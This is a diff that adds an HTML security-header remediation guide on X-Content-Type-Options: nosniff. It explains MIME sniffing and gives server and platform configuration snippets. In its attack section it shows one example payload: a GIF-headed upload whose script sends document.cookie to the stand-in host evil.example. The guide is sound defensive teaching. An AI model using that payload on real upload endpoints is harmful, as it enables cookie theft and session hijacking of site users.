@@ -1,0 +1,323 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>What is X-Content-Type-Options: nosniff and Why Does It Matter?</title>
+<meta name="description" content="Your security scanner flagged a missing X-Content-Type-Options header. This guide explains MIME sniffing attacks, what nosniff actually blocks, and gives copy-paste deployment snippets for nginx, Apache, Vercel, Netlify, and more.">
+<link rel="canonical" href="https://labs.copperbaytech.com/hardencheck/guides/x-content-type-options-nosniff.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="HardenCheck">
+<meta property="og:title" content="What is X-Content-Type-Options: nosniff and Why Does It Matter?">
+<meta property="og:description" content="Your security scanner flagged a missing X-Content-Type-Options header. This guide explains MIME sniffing attacks, what nosniff actually blocks, and gives copy-paste deployment snippets for nginx, Apache, Vercel, Netlify, and more.">
+<meta property="og:url" content="https://labs.copperbaytech.com/hardencheck/guides/x-content-type-options-nosniff.html">
+<meta property="og:image" content="https://labs.copperbaytech.com/hardencheck/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#faf8f4">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="../apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=Hanken+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"TechArticle","headline":"What is X-Content-Type-Options: nosniff and Why Does It Matter?","description":"Complete guide to the X-Content-Type-Options: nosniff security header: what MIME sniffing is, exactly what nosniff blocks (and what it doesn't), why it still matters in 2026, and platform-specific deployment snippets for nginx, Apache, Vercel, Next.js, Netlify, and Cloudflare Pages.","author":{"@type":"Organization","name":"Copper Bay Labs","url":"https://copperbaytech.com"},"publisher":{"@type":"Organization","name":"Copper Bay Labs","url":"https://copperbaytech.com"},"datePublished":"2026-07-05","dateModified":"2026-07-05","mainEntityOfPage":"https://labs.copperbaytech.com/hardencheck/guides/x-content-type-options-nosniff.html","mainEntity":{"@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Does adding nosniff break anything on my site?","acceptedAnswer":{"@type":"Answer","text":"Only if your server is already sending the wrong Content-Type for a file. For example, if your JavaScript files are being served as text/plain or application/octet-stream, adding nosniff will cause browsers to refuse to execute them — because nosniff tells the browser to honour your Content-Type exactly. The fix is to correct the MIME type on the server, not to remove nosniff. For correctly-typed content, nosniff is completely transparent."}},{"@type":"Question","name":"What is the difference between nosniff and Content-Security-Policy?","acceptedAnswer":{"@type":"Answer","text":"They address different stages of the same threat. A CSP script-src directive controls which URLs are allowed to be loaded as scripts at all — it's the allow/deny list. X-Content-Type-Options: nosniff controls how those responses are interpreted once they arrive — it prevents a non-JavaScript response from being executed as JavaScript. Both are necessary: CSP limits what can be fetched; nosniff ensures what is fetched can't be misinterpreted. They are complementary, not redundant."}},{"@type":"Question","name":"Does nosniff block image-based attacks?","acceptedAnswer":{"@type":"Answer","text":"nosniff specifically blocks MIME-type confusion for script and stylesheet requests. If a browser is about to execute a response as a script and the Content-Type is not a JavaScript MIME type, nosniff causes the browser to refuse. For images, audio, and video, nosniff does not add a content block — a malformed image still displays (or fails gracefully). The protection targets the specific attack vector where a non-script file gets interpreted and executed as JavaScript."}},{"@type":"Question","name":"My site has user file uploads — does nosniff help?","acceptedAnswer":{"@type":"Answer","text":"Yes, and this is one of the most important use cases. If an attacker uploads a file to your server and your server stores and serves it at a URL on your domain, nosniff ensures that even if that file contains JavaScript, the browser will not execute it as a script unless its Content-Type is a JavaScript MIME type. Combined with serving uploaded files from a separate domain or object store with the correct restrictive Content-Type, nosniff provides a meaningful additional layer."}},{"@type":"Question","name":"Which browsers support X-Content-Type-Options?","acceptedAnswer":{"@type":"Answer","text":"All modern browsers support it, and support for nosniff goes back to Internet Explorer 8 (where the header was first introduced by Microsoft in 2008 specifically to address MIME sniffing risks). In 2026, browser support is effectively universal across Chrome, Firefox, Safari, Edge, and any browser that matters for production web traffic. There is no meaningful compatibility reason to omit it."}},{"@type":"Question","name":"Does HardenCheck check for X-Content-Type-Options?","acceptedAnswer":{"@type":"Answer","text":"Yes. HardenCheck reads your response headers and checks whether X-Content-Type-Options is present and whether its value is nosniff. It appears as the MIME card in the report. If the header is missing or has an unrecognised value, the MIME card shows a fail. You can paste your raw response headers into HardenCheck and see the grade update in real time without touching your server."}}]}}
+</script>
+<link rel="stylesheet" href="../styles.css?v=1">
+<style>
+  .doc .lede{font-size:clamp(17px,2.3vw,20px);color:var(--muted)}
+  .doc h2{scroll-margin-top:80px}
+  .doc h3{font-family:"Fraunces",Georgia,serif;font-weight:600;font-size:19px;margin:22px 0 6px;letter-spacing:-.01em}
+  .toc{display:flex;flex-wrap:wrap;gap:10px;margin:22px 0 6px;padding:0;list-style:none}
+  .toc a{display:inline-block;background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-size:14px;font-weight:600;color:var(--muted)}
+  .toc a:hover{border-color:var(--bay);color:var(--ink);text-decoration:none}
+  .callout.warn-callout{background:var(--fail-bg);border-left-color:var(--fail);color:#5e2019}
+  .callout.tip-callout{background:var(--pass-bg);border-left-color:var(--pass);color:#1b4d30}
+  .doc code.inline{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em;background:var(--line-2);padding:2px 6px;border-radius:5px}
+  pre{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px 18px;overflow-x:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;line-height:1.6;margin:12px 0}
+  pre code{background:none;padding:0;font-size:inherit}
+  .severity-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:14px}
+  .severity-table th{text-align:left;padding:10px 12px;background:var(--surface);border-bottom:2px solid var(--line);font-weight:600}
+  .severity-table td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  .severity-table tr:last-child td{border-bottom:none}
+  .suite{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin:18px 0 6px}
+  .suite a{display:block;background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:16px 18px;box-shadow:var(--shadow);transition:box-shadow .15s,transform .15s,border-color .15s}
+  .suite a:hover{text-decoration:none;box-shadow:var(--shadow-lift);transform:translateY(-2px);border-color:var(--line-2)}
+  .suite .s-name{font-family:"Fraunces",serif;font-weight:600;font-size:17px;color:var(--ink);display:block;margin:0 0 4px}
+  .suite p{color:var(--muted);font-size:14px;margin:0}
+  .suite .s-tag{display:inline-block;margin-bottom:8px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--bay);background:var(--bay-tint,#e8f4f6);border:1px solid #cfe1e3;border-radius:6px;padding:2px 8px}
+  .faq-section{margin:18px 0}
+  .faq-section details{border-bottom:1px solid var(--line);padding:14px 0}
+  .faq-section details:first-child{border-top:1px solid var(--line)}
+  .faq-section summary{font-weight:600;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:12px}
+  .faq-section summary::-webkit-details-marker{display:none}
+  .faq-section summary::after{content:"+";font-size:20px;color:var(--muted);flex-shrink:0}
+  .faq-section details[open] summary::after{content:"\2212"}
+  .faq-section details p,.faq-section details ul{margin:12px 0 4px;color:var(--muted)}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to main content</a>
+
+<header class="masthead" role="banner">
+  <div class="wrap hdr-bar">
+    <a class="brand" href="../" aria-label="HardenCheck — go to homepage">
+      <svg class="mark" viewBox="0 0 64 64" aria-hidden="true">
+        <path d="M32 4 54 12 V30 C54 44 45 54 32 60 C19 54 10 44 10 30 V12 Z" fill="#bf6b3c"/>
+        <path d="M32 10 48 16 V30 C48 41 41.5 49 32 54 C22.5 49 16 41 16 30 V16 Z" fill="#14181f"/>
+        <rect x="23" y="22" width="18" height="3.4" rx="1.7" fill="#faf8f4"/>
+        <rect x="23" y="29" width="13" height="3.4" rx="1.7" fill="#7d8893"/>
+        <path d="M24 37.5 L30 43.5 L42 31.5" fill="none" stroke="#bf6b3c" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span class="wordmark">HardenCheck</span>
+    </a>
+    <nav class="nav" aria-label="Primary navigation">
+      <a href="../about.html">How it works</a>
+      <a href="add-content-security-policy-header.html">Fix guides</a>
+      <a href="../">Check my headers</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+<article class="doc">
+  <div class="wrap narrow">
+    <p class="eyebrow" style="text-align:left">Remediation guide</p>
+    <h1>What is X-Content-Type-Options: nosniff and Why Does It Matter?</h1>
+    <p class="lede">HardenCheck flagged your site for a missing <code class="inline">X-Content-Type-Options</code> header. This guide explains the MIME sniffing attack this header prevents, exactly what <code class="inline">nosniff</code> blocks (and what it does not), why it still matters even on modern browsers, and the exact one-liner to add on every major hosting platform.</p>
+
+    <ul class="toc" aria-label="On this page">
+      <li><a href="#mime-sniffing">What MIME sniffing is</a></li>
+      <li><a href="#the-attack">How sniffing becomes an attack</a></li>
+      <li><a href="#what-nosniff-does">What nosniff actually blocks</a></li>
+      <li><a href="#still-matters">Why it still matters in 2026</a></li>
+      <li><a href="#check-mime-types">Check your server's MIME types first</a></li>
+      <li><a href="#platform">Add it on your platform</a></li>
+      <li><a href="#verify">Verify with HardenCheck</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+
+    <h2 id="mime-sniffing">What MIME sniffing is</h2>
+    <p>Every HTTP response has a <code class="inline">Content-Type</code> header that tells the browser what kind of resource it received &mdash; <code class="inline">text/html</code>, <code class="inline">image/jpeg</code>, <code class="inline">text/javascript</code>, and so on. In the early web, many servers were misconfigured or lazy about setting this header. To keep pages working, browsers invented <strong>MIME sniffing</strong>: look at the first bytes of the response body and guess the content type from the content itself, rather than trusting the server&rsquo;s declaration.</p>
+    <p>This sounds helpful &mdash; and it was, for a while. But it means the browser can disagree with the server about what a file is. A server might declare <code class="inline">Content-Type: image/png</code>, the browser peeks at the bytes, decides they look like HTML or JavaScript, and processes the file accordingly. That gap between what the server says and what the browser executes is the vulnerability.</p>
+
+    <h2 id="the-attack">How MIME sniffing becomes an attack</h2>
+    <p>Here is the attack in practice. Your application has a user file upload endpoint. An attacker uploads a file that starts with a valid GIF header (<code class="inline">GIF89a</code>) followed by <code class="inline">&lt;script&gt;fetch('https://evil.example/steal?c='+document.cookie)&lt;/script&gt;</code>. Your server validates that the file starts with the GIF magic bytes and stores it. When your site serves that file back with <code class="inline">Content-Type: image/gif</code>, a browser performing MIME sniffing may look past the GIF header, find the script tag, decide the &ldquo;real&rdquo; type is HTML, and execute the embedded JavaScript &mdash; in the context of your origin. Cookies stolen.</p>
+    <p>This is not theoretical: it was a real exploit vector used against image hosting services, social platforms, and any site that served user-uploaded content from the same domain as the application. Internet Explorer was the most aggressive sniffer and the most commonly exploited; Chrome and Firefox sniff more conservatively but are still not completely immune in all resource contexts.</p>
+
+    <h2 id="what-nosniff-does">What <code class="inline">nosniff</code> actually blocks &mdash; and what it does not</h2>
+    <p>The header is simple: it has exactly one valid value.</p>
+    <pre><code>X-Content-Type-Options: nosniff</code></pre>
+    <p>When the browser receives this header on a response, it enforces the server&rsquo;s <code class="inline">Content-Type</code> declaration for two specific resource types:</p>
+    <table class="severity-table">
+      <thead>
+        <tr><th>Destination type</th><th>What nosniff enforces</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Scripts</strong></td>
+          <td>The browser refuses to execute the response if its <code class="inline">Content-Type</code> is not a JavaScript MIME type (<code class="inline">text/javascript</code>, <code class="inline">application/javascript</code>, or the standard IANA types). A file served as <code class="inline">text/plain</code>, <code class="inline">image/gif</code>, or <code class="inline">application/octet-stream</code> will not run.</td>
+        </tr>
+        <tr>
+          <td><strong>Stylesheets</strong></td>
+          <td>The browser refuses to parse the response as CSS if its <code class="inline">Content-Type</code> is not <code class="inline">text/css</code>.</td>
+        </tr>
+        <tr>
+          <td>Images, audio, video, documents</td>
+          <td><code class="inline">nosniff</code> does not block these. A wrong-typed image still renders (or fails gracefully). The header targets the critical code-execution path.</td>
+        </tr>
+      </tbody>
+    </table>
+    <p>The effect on the attack above: even if the browser would otherwise have sniffed and executed the GIF-wrapped script, <code class="inline">nosniff</code> stops that. The browser honours the server&rsquo;s <code class="inline">image/gif</code> declaration, treats the file as an image, and ignores the script content.</p>
+
+    <div class="callout tip-callout">
+      <strong>nosniff and CSP are complementary, not redundant.</strong> A <code class="inline">Content-Security-Policy</code> <code class="inline">script-src</code> directive controls <em>which URLs</em> are allowed to be loaded as scripts. <code class="inline">nosniff</code> controls <em>how responses are interpreted</em> once they arrive. A strict CSP without <code class="inline">nosniff</code> may still allow MIME-confused execution of files already on your domain. Both headers should be set.
+    </div>
+
+    <h2 id="still-matters">Why it still matters in 2026</h2>
+    <p>You might assume that modern browsers have fixed MIME sniffing and this is a legacy concern. The reality is more nuanced:</p>
+    <ul>
+      <li><strong>CDNs and object stores</strong> (Amazon S3, Google Cloud Storage, Cloudflare R2, Backblaze B2) often default to <code class="inline">application/octet-stream</code> for unknown file types and can be misconfigured to serve user uploads with permissive or wrong content types. If those files are served from your application domain, <code class="inline">nosniff</code> prevents MIME confusion at the browser level regardless of what the storage bucket sends.</li>
+      <li><strong>CSP <code>script-src 'self'</code> does not prevent same-origin MIME confusion.</strong> A CSP that restricts scripts to your own origin still allows any correctly-typed resource from your domain to run as a script. If an attacker uploads a file to your server and you serve it at a URL on your domain without <code class="inline">nosniff</code>, a browser that sniffs it as JavaScript will execute it even with a strict CSP in place.</li>
+      <li><strong>Browser behaviour varies by context.</strong> The Fetch standard defines when MIME sniffing applies, but the implementation differs across browsers and resource types. <code class="inline">nosniff</code> is the server-side declaration that closes this variance: you are explicitly opting into strict type enforcement rather than depending on each browser&rsquo;s sniffing heuristic.</li>
+      <li><strong>It is a free header.</strong> There is no performance cost, no configuration complexity, no compatibility risk for correctly-typed content. Every security scanner and best-practice checklist flags its absence. Setting it is a five-second change.</li>
+    </ul>
+
+    <h2 id="check-mime-types">Check your server&rsquo;s MIME types before adding nosniff</h2>
+    <p><code class="inline">nosniff</code> is only as good as your <code class="inline">Content-Type</code> headers being correct. If your server is already serving <code class="inline">.js</code> files as <code class="inline">text/plain</code> or <code class="inline">application/octet-stream</code>, adding <code class="inline">nosniff</code> will cause browsers to refuse to execute those scripts &mdash; which is the correct security behaviour, but it will break your site until you fix the MIME types. Before you deploy the header, verify:</p>
+    <pre><code>curl -I https://yoursite.com/your-script.js</code></pre>
+    <p>Look for <code class="inline">content-type: text/javascript</code> or <code class="inline">content-type: application/javascript</code> in the response. If you see <code class="inline">text/plain</code>, <code class="inline">application/octet-stream</code>, or any other value, fix the MIME type on your server first. Most web servers and CDNs handle <code class="inline">.js</code>, <code class="inline">.css</code>, and <code class="inline">.html</code> correctly by default, but static asset hosting configurations sometimes override or strip the content-type.</p>
+
+    <div class="callout tip-callout">
+      <strong>Quick browser check.</strong> Open DevTools &rarr; Network tab, reload your page, click any <code class="inline">.js</code> resource, and read the <code class="inline">content-type</code> response header in the Headers panel. It should say <code class="inline">text/javascript</code> or <code class="inline">application/javascript</code>.
+    </div>
+
+    <h2 id="platform">Add it on your platform</h2>
+    <p>Once you&rsquo;ve confirmed your MIME types are correct, add the header. It&rsquo;s a one-liner on every platform.</p>
+
+    <h3>nginx</h3>
+    <pre><code>add_header X-Content-Type-Options "nosniff" always;</code></pre>
+
+    <h3>Apache (.htaccess)</h3>
+    <pre><code>&lt;IfModule mod_headers.c&gt;
+  Header always set X-Content-Type-Options "nosniff"
+&lt;/IfModule&gt;</code></pre>
+
+    <h3>Vercel (vercel.json)</h3>
+    <pre><code>{
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        {
+          "key": "X-Content-Type-Options",
+          "value": "nosniff"
+        }
+      ]
+    }
+  ]
+}</code></pre>
+
+    <h3>Next.js (next.config.js)</h3>
+    <pre><code>const securityHeaders = [
+  {
+    key: 'X-Content-Type-Options',
+    value: 'nosniff'
+  }
+];
+
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/(.*)',
+        headers: securityHeaders,
+      },
+    ];
+  },
+};</code></pre>
+
+    <h3>Netlify (_headers file)</h3>
+    <pre><code>/*
+  X-Content-Type-Options: nosniff</code></pre>
+
+    <h3>Cloudflare Pages (_headers file)</h3>
+    <pre><code>/*
+  X-Content-Type-Options: nosniff</code></pre>
+
+    <div class="callout tip-callout">
+      <strong>GitHub Pages.</strong> GitHub Pages does not allow custom response headers on standard deployments. If you need full header control on a static site, route traffic through a Cloudflare proxy and use a Cloudflare Transform Rule to inject <code class="inline">X-Content-Type-Options: nosniff</code>. Alternatively, deploy to Cloudflare Pages or Netlify, which both support the <code class="inline">_headers</code> file approach above.
+    </div>
+
+    <p>If you are setting multiple security headers (which you should be), add them together to keep your configuration readable and audit-friendly:</p>
+    <pre><code># nginx — all four core headers together
+add_header X-Content-Type-Options "nosniff" always;
+add_header X-Frame-Options "DENY" always;
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+add_header Content-Security-Policy "default-src 'self'" always;</code></pre>
+
+    <h2 id="verify">Verify with HardenCheck</h2>
+    <p>After deploying the header, fetch your site&rsquo;s response headers with <code class="inline">curl -I https://yoursite.com</code> and paste the output into HardenCheck. The MIME card will immediately show whether <code class="inline">X-Content-Type-Options: nosniff</code> is present. You can also use HardenCheck&rsquo;s live URL mode for a quick check against a publicly reachable site, or iterate on a pasted header block without touching your server.</p>
+
+    <p style="margin:24px 0 8px"><a class="btn primary" href="../">Grade my headers with HardenCheck &rarr;</a></p>
+
+    <h2 id="faq">Frequently asked questions</h2>
+    <div class="faq-section">
+      <details open>
+        <summary>Does adding <code class="inline">nosniff</code> break anything on my site?</summary>
+        <p>Only if your server is already sending the wrong <code class="inline">Content-Type</code> for a resource. If your JavaScript files are served as <code class="inline">text/plain</code> or <code class="inline">application/octet-stream</code>, adding <code class="inline">nosniff</code> will cause browsers to refuse to execute them &mdash; because that is exactly what the header is designed to do. The fix is to correct the MIME type on your server (see the section above), not to remove <code class="inline">nosniff</code>. For content that is already served with correct types, the header is completely transparent to end users.</p>
+      </details>
+      <details>
+        <summary>What&rsquo;s the difference between <code class="inline">nosniff</code> and Content-Security-Policy?</summary>
+        <p>They target different stages of the same threat. A CSP <code class="inline">script-src</code> controls <em>which URLs</em> can be fetched and loaded as scripts &mdash; it&rsquo;s an allow/deny list at the network layer. <code class="inline">X-Content-Type-Options: nosniff</code> controls <em>how a response is interpreted</em> once it arrives &mdash; it prevents a non-JavaScript response from being executed as JavaScript regardless of where it came from. Both are necessary: CSP limits what can be fetched; <code class="inline">nosniff</code> ensures that what is fetched is not misinterpreted. A CSP with <code class="inline">script-src 'self'</code> does not prevent MIME confusion for files already hosted on your own domain.</p>
+      </details>
+      <details>
+        <summary>Does <code class="inline">nosniff</code> protect against image-based attacks?</summary>
+        <p>Only for the specific case where a file with an image content-type would otherwise be sniffed and executed as a script. <code class="inline">nosniff</code> does not block images from loading, audio from playing, or documents from rendering. It prevents MIME-type confusion at the code-execution boundary: script and stylesheet requests. An attacker who can upload an image to your server and get it served from your domain still cannot have it <em>executed</em> as JavaScript if <code class="inline">nosniff</code> is set and the server correctly sends a non-JavaScript content-type for the file.</p>
+      </details>
+      <details>
+        <summary>My site has user file uploads &mdash; does <code class="inline">nosniff</code> help?</summary>
+        <p>Yes, and this is one of the most important real-world use cases. If an attacker uploads a file that embeds JavaScript, <code class="inline">nosniff</code> ensures that file cannot be executed as a script as long as your server sends a non-JavaScript <code class="inline">Content-Type</code> for it. For maximum protection on sites with user uploads, combine <code class="inline">nosniff</code> with: (1) serving user-uploaded files from a separate subdomain or storage domain (so they have a different origin from your application), and (2) validating and enforcing MIME types server-side before storage (don&rsquo;t trust the client&rsquo;s declared type). <code class="inline">nosniff</code> is the browser-level backstop; correct server-side handling is the first line of defence.</p>
+      </details>
+      <details>
+        <summary>Which browsers support <code class="inline">X-Content-Type-Options</code>?</summary>
+        <p>All modern browsers, and support goes back to Internet Explorer 8, where Microsoft introduced the header in 2008 specifically to address MIME sniffing risks. Chrome, Firefox, Safari, and Edge all support it. In 2026, browser support for <code class="inline">nosniff</code> is effectively universal &mdash; there is no meaningful compatibility reason to omit it. The Fetch and HTML Living Standards both specify the expected browser behaviour for this header.</p>
+      </details>
+      <details>
+        <summary>Does HardenCheck check for <code class="inline">X-Content-Type-Options</code>?</summary>
+        <p>Yes. HardenCheck reads your response headers and checks whether <code class="inline">X-Content-Type-Options</code> is present and whether its value is <code class="inline">nosniff</code>. It appears as the MIME card in the grading report. You can paste raw headers from <code class="inline">curl -I yoursite.com</code> directly into the paste-mode box and see the grade update in real time as you edit the header values &mdash; useful for confirming the change before deploying it.</p>
+      </details>
+    </div>
+
+    <h2 style="margin-top:48px">Also in the Copper Bay Labs ship-safety suite</h2>
+    <p>Once your headers are hardened, these tools and guides cover the rest of your security posture:</p>
+    <div class="suite">
+      <a href="add-content-security-policy-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Add a CSP header</span>
+        <p>Write a Content-Security-Policy that blocks XSS without breaking your site &mdash; with report-only mode, nonces, hashes, and platform snippets.</p>
+      </a>
+      <a href="enable-hsts-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Enable HSTS</span>
+        <p>Force HTTPS at the browser level so attackers can&rsquo;t SSL-strip your connections. Covers max-age, includeSubDomains, and preload warnings.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">Secret scanning</span>
+        <span class="s-name">LeakCheck</span>
+        <p>Paste code or a config file and see exposed API keys and secrets flagged before they reach the repo.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/exposurecheck/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">Post-deploy</span>
+        <span class="s-name">ExposureCheck</span>
+        <p>Scan your live URL for exposed <code class="inline">.env</code> files, <code class="inline">.git</code> directories, source maps, and bundled secrets.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/depcheck/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">Dependency risk</span>
+        <span class="s-name">DepCheck</span>
+        <p>Paste your <code class="inline">package.json</code> and see vulnerable, abandoned, typosquatted, and risky-license packages flagged by severity.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/shipsafe/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">ADA &amp; privacy</span>
+        <span class="s-name">ShipSafe</span>
+        <p>Check your site for WCAG accessibility failures and privacy-risk patterns before they become liabilities.</p>
+      </a>
+    </div>
+  </div>
+</article>
+</main>
+
+<footer class="footer" role="contentinfo">
+  <div class="wrap foot">
+    <div>
+      <a class="brand small" href="../" aria-label="HardenCheck &mdash; homepage">
+        <svg class="mark" viewBox="0 0 64 64" aria-hidden="true">
+          <path d="M32 4 54 12 V30 C54 44 45 54 32 60 C19 54 10 44 10 30 V12 Z" fill="#cbd2da"/>
+          <path d="M32 10 48 16 V30 C48 41 41.5 49 32 54 C22.5 49 16 41 16 30 V16 Z" fill="#14181f"/>
+          <rect x="23" y="22" width="18" height="3.4" rx="1.7" fill="#faf8f4"/>
+          <rect x="23" y="29" width="13" height="3.4" rx="1.7" fill="#7d8893"/>
+          <path d="M24 37.5 L30 43.5 L42 31.5" fill="none" stroke="#bf6b3c" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="wordmark">HardenCheck</span>
+      </a>
+      <p class="fine">A header &amp; cookie hardening check &mdash; not a full security audit or guarantee.</p>
+    </div>
+    <nav class="foot-nav" aria-label="Footer navigation">
+      <a href="../about.html">How it works</a>
+      <a href="add-content-security-policy-header.html">Fix guides</a>
+      <a href="https://labs.copperbaytech.com/shipsafe/" target="_blank" rel="noopener noreferrer">ShipSafe</a>
+      <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">LeakCheck</a>
+      <a href="https://labs.copperbaytech.com/exposurecheck/" target="_blank" rel="noopener noreferrer">ExposureCheck</a>
+      <a href="https://labs.copperbaytech.com/depcheck/" target="_blank" rel="noopener noreferrer">DepCheck</a>
+      <a href="https://copperbaytech.com" target="_blank" rel="noopener noreferrer">Secure my project &rarr;</a>
+    </nav>
+  </div>
+  <div class="wrap">
+    <p class="madeby">A <a href="https://copperbaytech.com" target="_blank" rel="noopener noreferrer">Copper Bay Labs</a> product.
+    <span class="disclaimer">This is a free hardening tool, not professional security advice.</span></p>
+  </div>
+</footer>
+
+</body>
+</html>
